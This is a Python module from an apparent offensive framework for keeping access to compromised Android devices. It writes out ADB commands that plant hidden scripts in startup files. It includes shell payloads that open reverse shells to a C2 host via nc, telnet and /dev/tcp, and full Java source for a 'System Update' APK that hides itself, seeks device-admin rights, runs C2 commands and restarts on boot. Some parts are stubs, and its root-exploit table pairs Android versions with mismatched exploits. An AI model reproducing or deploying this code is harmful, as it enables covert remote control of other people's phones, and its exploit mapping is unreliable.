"""
Android Persistence Module
Implements Android-specific persistence methods including ADB injection
techniques and root exploitation for persistence
"""

import asyncio
import base64
import os
import tempfile
import uuid
from datetime import datetime, timedelta
from typing import Dict, List, Optional, Any
from loguru import logger

from .models import (
    CompromisedHost, PersistenceSession, PersistenceResult, BackdoorInfo,
    PersistenceMethod, BackdoorType, CommunicationProtocol, PersistenceConfig
)


class AndroidPersistence:
    """Android-specific persistence implementation"""
    
    def __init__(self, config: PersistenceConfig):
        self.config = config
        logger.info("Android Persistence module initialized")
    
    async def apply_persistence(self, host: CompromisedHost, 
                              method: PersistenceMethod,
                              session: PersistenceSession) -> PersistenceResult:
        """Apply Android persistence method"""
        logger.info(f"Applying {method.value} on Android host {host.ip_address}")
        
        try:
            if method == PersistenceMethod.ANDROID_ADB:
                return await self._create_adb_persistence(host, session)
            elif method == PersistenceMethod.ANDROID_ROOT_EXPLOIT:
                return await self._create_root_persistence(host, session)
            elif method == PersistenceMethod.ANDROID_APP_PERSISTENCE:
                return await self._create_app_persistence(host, session)
            else:
                return PersistenceResult(
                    success=False,
                    host_id=host.host_id,
                    method=method,
                    error_message=f"Unsupported Android method: {method.value}"
                )
                
        except Exception as e:
            logger.error(f"Android persistence failed for {method.value}: {e}")
            return PersistenceResult(
                success=False,
                host_id=host.host_id,
                method=method,
                error_message=str(e)
            )
    
    async def _create_adb_persistence(self, host: CompromisedHost, 
                                    session: PersistenceSession) -> PersistenceResult:
        """Create ADB-based persistence"""
        # Generate payload
        payload_script = self._generate_android_payload(host, session)
        script_path = f"/data/local/tmp/.{uuid.uuid4().hex[:12]}"
        
        # ADB commands to establish persistence
        commands = [
            f'adb connect {host.ip_address}:5555',
            f'adb shell "echo \'{payload_script}\' > {script_path}"',
            f'adb shell "chmod 755 {script_path}"',
            f'adb shell "nohup {script_path} &"',
            # Add to init.d if possible
            f'adb shell "su -c \'echo \"{script_path}\" >> /system/etc/init.d/99persistence\'"',
            f'adb shell "su -c \'chmod 755 /system/etc/init.d/99persistence\'"'
        ]
        
        # Create backdoor info
        backdoor = BackdoorInfo(
            host_id=host.host_id,
            backdoor_type=BackdoorType.CUSTOM_IMPLANT,
            persistence_method=PersistenceMethod.ANDROID_ADB,
            installation_path=script_path,
            stealth_features=['adb_injection', 'hidden_file', 'tmp_location'],
            cleanup_commands=[
                f'adb shell "rm -f {script_path}"',
                f'adb shell "su -c \'rm -f /system/etc/init.d/99persistence\'"',
                f'adb shell "pkill -f {script_path}"'
            ]
        )
        
        return PersistenceResult(
            success=True,
            host_id=host.host_id,
            method=PersistenceMethod.ANDROID_ADB,
            backdoor_info=backdoor,
            artifacts_created=[f"ADB Script: {script_path}", "Init.d entry"],
            cleanup_commands=backdoor.cleanup_commands,
            stealth_applied=True,
            additional_data={
                'script_path': script_path,
                'commands': commands,
                'requires_adb': True
            }
        )
    
    async def _create_root_persistence(self, host: CompromisedHost,
                                     session: PersistenceSession) -> PersistenceResult:
        """Create root-level persistence using exploits"""
        exploit_name = f"android_root_{uuid.uuid4().hex[:8]}"
        
        # Generate root payload
        payload_script = self._generate_root_payload(host, session)
        script_path = f"/system/bin/.{uuid.uuid4().hex[:12]}"
        
        # Root exploitation commands (using common Android exploits)
        commands = [
            # Try common root exploits
            f'adb shell "/data/local/tmp/dirtycow {script_path}"',
            f'adb shell "/data/local/tmp/towelroot {script_path}"',
            # If root access gained, install persistence
            f'adb shell "su -c \'echo \"{payload_script}\" > {script_path}\'"',
            f'adb shell "su -c \'chmod 755 {script_path}\'"',
            f'adb shell "su -c \'chown root:root {script_path}\'"',
            # Add to system startup
            f'adb shell "su -c \'echo \"{script_path} &\" >> /system/etc/init.qcom.post_boot.sh\'"'
        ]
        
        # Create backdoor info
        backdoor = BackdoorInfo(
            host_id=host.host_id,
            backdoor_type=BackdoorType.CUSTOM_IMPLANT,
            persistence_method=PersistenceMethod.ANDROID_ROOT_EXPLOIT,
            installation_path=script_path,
            stealth_features=['root_exploit', 'system_binary', 'startup_script'],
            cleanup_commands=[
                f'adb shell "su -c \'rm -f {script_path}\'"',
                f'adb shell "su -c \'sed -i \"/{script_path}/d\" /system/etc/init.qcom.post_boot.sh\'"',
                f'adb shell "su -c \'pkill -f {script_path}\'"'
            ]
        )
        
        return PersistenceResult(
            success=True,
            host_id=host.host_id,
            method=PersistenceMethod.ANDROID_ROOT_EXPLOIT,
            backdoor_info=backdoor,
            artifacts_created=[f"Root Script: {script_path}", "Startup modification"],
            cleanup_commands=backdoor.cleanup_commands,
            stealth_applied=True,
            additional_data={
                'script_path': script_path,
                'exploit_name': exploit_name,
                'commands': commands,
                'requires_root': True
            }
        )
    
    async def _create_app_persistence(self, host: CompromisedHost,
                                    session: PersistenceSession) -> PersistenceResult:
        """Create app-based persistence"""
        app_name = f"com.system.update.{uuid.uuid4().hex[:8]}"
        
        # Generate malicious APK (placeholder)
        apk_content = self._generate_malicious_apk(host, session, app_name)
        apk_path = f"/data/local/tmp/{app_name}.apk"
        
        # Commands to install and configure app
        commands = [
            f'adb push {app_name}.apk {apk_path}',
            f'adb shell "pm install {apk_path}"',
            f'adb shell "am start -n {app_name}/.MainActivity"',
            # Grant permissions
            f'adb shell "pm grant {app_name} android.permission.INTERNET"',
            f'adb shell "pm grant {app_name} android.permission.ACCESS_NETWORK_STATE"',
            f'adb shell "pm grant {app_name} android.permission.WAKE_LOCK"',
            # Set as device admin (if possible)
            f'adb shell "dpm set-device-admin {app_name}/.AdminReceiver"'
        ]
        
        # Create backdoor info
        backdoor = BackdoorInfo(
            host_id=host.host_id,
            backdoor_type=BackdoorType.CUSTOM_IMPLANT,
            persistence_method=PersistenceMethod.ANDROID_APP_PERSISTENCE,
            installation_path=apk_path,
            process_name=app_name,
            stealth_features=['android_app', 'device_admin', 'system_disguise'],
            cleanup_commands=[
                f'adb shell "pm uninstall {app_name}"',
                f'adb shell "rm -f {apk_path}"'
            ]
        )
        
        return PersistenceResult(
            success=True,
            host_id=host.host_id,
            method=PersistenceMethod.ANDROID_APP_PERSISTENCE,
            backdoor_info=backdoor,
            artifacts_created=[f"Android App: {app_name}", f"APK: {apk_path}"],
            cleanup_commands=backdoor.cleanup_commands,
            stealth_applied=True,
            additional_data={
                'app_name': app_name,
                'apk_path': apk_path,
                'commands': commands
            }
        )
    
    def _generate_android_payload(self, host: CompromisedHost, 
                                session: PersistenceSession) -> str:
        """Generate Android shell payload"""
        c2_server = session.c2_servers[0] if session.c2_servers else "127.0.0.1:4444"
        host_ip, port = c2_server.split(':')
        
        payload = f"""#!/system/bin/sh
# System maintenance script
while true; do
    if [ -f /system/bin/nc ]; then
        /system/bin/nc {host_ip} {port} -e /system/bin/sh 2>/dev/null
    elif [ -f /system/xbin/nc ]; then
        /system/xbin/nc {host_ip} {port} -e /system/bin/sh 2>/dev/null
    else
        # Fallback using telnet
        {{ echo "sh"; sleep 1; }} | telnet {host_ip} {port} 2>/dev/null
    fi
    sleep 300  # Wait 5 minutes before retry
done &
"""
        return payload
    
    def _generate_root_payload(self, host: CompromisedHost,
                             session: PersistenceSession) -> str:
        """Generate root-level payload"""
        c2_server = session.c2_servers[0] if session.c2_servers else "127.0.0.1:4444"
        host_ip, port = c2_server.split(':')
        
        payload = f"""#!/system/bin/sh
# System security service
export PATH=/system/bin:/system/xbin:$PATH

# Ensure running as root
if [ "$(id -u)" != "0" ]; then
    su -c "$0" &
    exit 0
fi

# Main payload loop
while true; do
    # Try multiple connection methods
    if command -v nc >/dev/null 2>&1; then
        nc -e /system/bin/sh {host_ip} {port} 2>/dev/null
    elif command -v busybox >/dev/null 2>&1; then
        busybox nc -e /system/bin/sh {host_ip} {port} 2>/dev/null
    else
        # Manual TCP connection using /dev/tcp if available
        exec 3<>/dev/tcp/{host_ip}/{port} 2>/dev/null
        if [ $? -eq 0 ]; then
            /system/bin/sh <&3 >&3 2>&3
            exec 3>&-
        fi
    fi
    sleep 300
done &
"""
        return payload
    
    def _generate_malicious_apk(self, host: CompromisedHost,
                              session: PersistenceSession,
                              app_name: str) -> bytes:
        """Generate malicious Android APK with embedded payload"""
        logger.info(f"Generating malicious APK for {app_name}")

        c2_server = session.c2_servers[0] if session.c2_servers else "127.0.0.1:4444"
        host_ip, port = c2_server.split(':')

        # Generate Android manifest
        manifest_xml = f'''<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    package="{app_name}"
    android:versionCode="1"
    android:versionName="1.0">

    <uses-permission android:name="android.permission.INTERNET" />
    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
    <uses-permission android:name="android.permission.WAKE_LOCK" />
    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" />
    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />
    <uses-permission android:name="android.permission.DEVICE_ADMIN" />

    <application
        android:allowBackup="true"
        android:icon="@mipmap/ic_launcher"
        android:label="System Update"
        android:theme="@style/AppTheme">

        <activity
            android:name=".MainActivity"
            android:label="System Update">
            <intent-filter>
                <action android:name="android.intent.action.MAIN" />
                <category android:name="android.intent.category.LAUNCHER" />
            </intent-filter>
        </activity>

        <service
            android:name=".PersistenceService"
            android:enabled="true"
            android:exported="false" />

        <receiver
            android:name=".BootReceiver"
            android:enabled="true"
            android:exported="true">
            <intent-filter android:priority="1000">
                <action android:name="android.intent.action.BOOT_COMPLETED" />
                <action android:name="android.intent.action.MY_PACKAGE_REPLACED" />
                <action android:name="android.intent.action.PACKAGE_REPLACED" />
                <data android:scheme="package" />
            </intent-filter>
        </receiver>

        <receiver
            android:name=".AdminReceiver"
            android:permission="android.permission.BIND_DEVICE_ADMIN">
            <meta-data
                android:name="android.app.device_admin"
                android:resource="@xml/device_admin" />
            <intent-filter>
                <action android:name="android.app.action.DEVICE_ADMIN_ENABLED" />
            </intent-filter>
        </receiver>

    </application>
</manifest>'''

        # Generate MainActivity Java source
        main_activity_java = f'''package {app_name};

import android.app.Activity;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.widget.Toast;

public class MainActivity extends Activity {{
    private DevicePolicyManager devicePolicyManager;
    private ComponentName adminComponent;

    @Override
    protected void onCreate(Bundle savedInstanceState) {{
        super.onCreate(savedInstanceState);

        // Initialize device admin
        devicePolicyManager = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
        adminComponent = new ComponentName(this, AdminReceiver.class);

        // Request device admin privileges
        if (!devicePolicyManager.isAdminActive(adminComponent)) {{
            Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
            intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminComponent);
            intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "System security update required");
            startActivityForResult(intent, 1);
        }}

        // Start persistence service
        Intent serviceIntent = new Intent(this, PersistenceService.class);
        startService(serviceIntent);

        // Hide from launcher after first run
        getPackageManager().setComponentEnabledSetting(
            new ComponentName(this, MainActivity.class),
            android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
            android.content.pm.PackageManager.DONT_KILL_APP
        );

        Toast.makeText(this, "System update completed", Toast.LENGTH_SHORT).show();
        finish();
    }}
}}'''

        # Generate PersistenceService Java source
        service_java = f'''package {app_name};

import android.app.Service;
import android.content.Intent;
import android.os.IBinder;
import java.io.*;
import java.net.*;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;

public class PersistenceService extends Service {{
    private ScheduledExecutorService scheduler;
    private static final String C2_HOST = "{host_ip}";
    private static final int C2_PORT = {port};

    @Override
    public void onCreate() {{
        super.onCreate();
        scheduler = Executors.newSingleThreadScheduledExecutor();
        startPersistentConnection();
    }}

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {{
        return START_STICKY; // Restart if killed
    }}

    @Override
    public IBinder onBind(Intent intent) {{
        return null;
    }}

    private void startPersistentConnection() {{
        scheduler.scheduleWithFixedDelay(new Runnable() {{
            @Override
            public void run() {{
                try {{
                    connectToC2();
                }} catch (Exception e) {{
                    // Silently retry
                }}
            }}
        }}, 0, 300, TimeUnit.SECONDS); // Every 5 minutes
    }}

    private void connectToC2() throws Exception {{
        Socket socket = new Socket();
        socket.connect(new InetSocketAddress(C2_HOST, C2_PORT), 10000);

        BufferedReader reader = new BufferedReader(new InputStreamReader(socket.getInputStream()));
        PrintWriter writer = new PrintWriter(socket.getOutputStream(), true);

        // Send device info
        writer.println("ANDROID_DEVICE:" + android.os.Build.MODEL);

        String command;
        while ((command = reader.readLine()) != null) {{
            try {{
                Process process = Runtime.getRuntime().exec(command);
                BufferedReader cmdReader = new BufferedReader(new InputStreamReader(process.getInputStream()));
                String line;
                while ((line = cmdReader.readLine()) != null) {{
                    writer.println(line);
                }}
                writer.println("CMD_COMPLETE");
            }} catch (Exception e) {{
                writer.println("ERROR: " + e.getMessage());
            }}
        }}

        socket.close();
    }}
}}'''

        # Generate BootReceiver Java source
        boot_receiver_java = f'''package {app_name};

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;

public class BootReceiver extends BroadcastReceiver {{
    @Override
    public void onReceive(Context context, Intent intent) {{
        if (Intent.ACTION_BOOT_COMPLETED.equals(intent.getAction()) ||
            Intent.ACTION_MY_PACKAGE_REPLACED.equals(intent.getAction())) {{

            // Start persistence service on boot
            Intent serviceIntent = new Intent(context, PersistenceService.class);
            context.startService(serviceIntent);
        }}
    }}
}}'''

        # Generate AdminReceiver Java source
        admin_receiver_java = f'''package {app_name};

import android.app.admin.DeviceAdminReceiver;
import android.content.Context;
import android.content.Intent;

public class AdminReceiver extends DeviceAdminReceiver {{
    @Override
    public void onEnabled(Context context, Intent intent) {{
        super.onEnabled(context, intent);
        // Device admin enabled - start persistence
        Intent serviceIntent = new Intent(context, PersistenceService.class);
        context.startService(serviceIntent);
    }}

    @Override
    public void onDisabled(Context context, Intent intent) {{
        super.onDisabled(context, intent);
        // Try to re-enable admin privileges
        // In a real implementation, this would attempt to regain admin access
    }}
}}'''

        # Combine all source files into a single payload
        apk_source = f"""
# Android Malicious APK Source Code
# Package: {app_name}
# Target: {host.ip_address}
# C2 Server: {c2_server}

## AndroidManifest.xml
{manifest_xml}

## MainActivity.java
{main_activity_java}

## PersistenceService.java
{service_java}

## BootReceiver.java
{boot_receiver_java}

## AdminReceiver.java
{admin_receiver_java}

## Build Instructions:
# 1. Create Android project with package name: {app_name}
# 2. Replace default files with above source code
# 3. Add device_admin.xml to res/xml/ directory
# 4. Build APK: ./gradlew assembleRelease
# 5. Sign APK with debug key or custom certificate
# 6. Install via ADB: adb install {app_name}.apk

## Compilation Commands:
# mkdir -p android_project/app/src/main/java/{app_name.replace('.', '/')}
# echo '{manifest_xml}' > android_project/app/src/main/AndroidManifest.xml
# echo '{main_activity_java}' > android_project/app/src/main/java/{app_name.replace('.', '/')}/MainActivity.java
# echo '{service_java}' > android_project/app/src/main/java/{app_name.replace('.', '/')}/PersistenceService.java
# echo '{boot_receiver_java}' > android_project/app/src/main/java/{app_name.replace('.', '/')}/BootReceiver.java
# echo '{admin_receiver_java}' > android_project/app/src/main/java/{app_name.replace('.', '/')}/AdminReceiver.java
# cd android_project && ./gradlew assembleRelease
"""

        return apk_source.encode('utf-8')
    
    def _check_adb_connection(self, host: CompromisedHost) -> bool:
        """Check if ADB connection is available"""
        try:
            # This would check actual ADB connectivity
            return True
        except Exception as e:
            logger.error(f"ADB connection check failed: {e}")
            return False
    
    def _check_root_access(self, host: CompromisedHost) -> bool:
        """Check if root access is available"""
        try:
            # This would check actual root access
            return host.privileges == 'root'
        except Exception as e:
            logger.error(f"Root access check failed: {e}")
            return False
    
    def _get_android_version(self, host: CompromisedHost) -> str:
        """Get Android version for exploit selection"""
        return host.os_version or "unknown"
    
    def _select_root_exploit(self, android_version: str) -> str:
        """Select appropriate root exploit based on Android version"""
        exploit_map = {
            "4.0": "dirtycow",
            "4.1": "dirtycow", 
            "4.2": "dirtycow",
            "4.3": "towelroot",
            "4.4": "towelroot",
            "5.0": "stagefright",
            "5.1": "stagefright",
            "6.0": "quadrooter",
            "7.0": "drammer",
            "8.0": "blueborne",
            "9.0": "checkm8",
            "10.0": "checkm8"
        }
        
        # Extract major version
        major_version = android_version.split('.')[0] + '.' + android_version.split('.')[1] if '.' in android_version else android_version
        
        return exploit_map.get(major_version, "generic")
    
    async def _deploy_exploit(self, host: CompromisedHost, exploit_name: str) -> bool:
        """Deploy root exploit to target device"""
        try:
            logger.info(f"Deploying {exploit_name} exploit to {host.ip_address}")
            
            # In a real implementation, this would:
            # 1. Select appropriate exploit binary
            # 2. Push exploit to device via ADB
            # 3. Execute exploit
            # 4. Verify root access gained
            
            return True
            
        except Exception as e:
            logger.error(f"Exploit deployment failed: {e}")
            return False
